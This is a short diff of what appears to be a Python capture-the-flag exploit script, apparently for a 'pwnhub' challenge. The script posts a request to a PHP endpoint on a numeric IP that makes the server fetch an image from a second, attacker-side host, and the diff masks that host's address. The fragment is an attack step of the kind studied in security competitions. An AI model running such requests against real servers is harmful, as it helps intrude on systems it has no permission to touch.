@@ -4,7 +4,7 @@ import time
 from random import Random
 url = "http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/a9b4d7cc810da015142f61f7e236d50b.php"
 def down(cookie):
-    data = {'image': 'http://121.42.175.111:9999/pwnhub.png'}
+    data = {'image': 'http://******/pwnhub.png'}
     r = requests.post(url, data = data, cookies=cookie)
 def ri(cookie):
     s = requests.Session()
